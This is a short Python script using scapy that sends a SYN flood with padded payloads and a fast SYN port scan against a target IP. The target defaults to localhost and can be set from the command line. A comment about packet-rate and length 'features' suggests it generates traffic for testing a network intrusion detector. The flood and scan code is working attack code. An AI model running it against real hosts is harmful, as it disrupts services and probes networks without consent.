from scapy.all import IP, TCP, Raw, send
import time
import sys
import random

def high_intensity_flood(target_ip, port=80, count=500):
    print(f"[*] Starting High-Intensity DoS Flood on {target_ip}:{port} ({count} packets)...")
    
    # Create a list of packets with some payload to increase bytes/s and length features
    payload = "A" * 100
    packets = [IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=port, flags="S")/Raw(load=payload) for _ in range(count)]
    
    # Send packets as fast as possible
    send(packets, verbose=False)
    print("[*] Flood complete.")

def aggressive_portscan(target_ip, start_port=1, end_port=200):
    print(f"[*] Starting Aggressive PortScan on {target_ip} (Ports {start_port}-{end_port})...")
    
    packets = []
    for port in range(start_port, end_port + 1):
        pkt = IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
        packets.append(pkt)
    
    # Send all at once to maximize packets/s
    send(packets, verbose=False)
    print("[*] Aggressive PortScan complete.")

if __name__ == "__main__":
    target = "127.0.0.1"
    if len(sys.argv) > 1:
        target = sys.argv[1]
    
    mode = "flood"
    if len(sys.argv) > 2:
        mode = sys.argv[2]

    if mode == "scan":
        aggressive_portscan(target)
    else:
        high_intensity_flood(target)
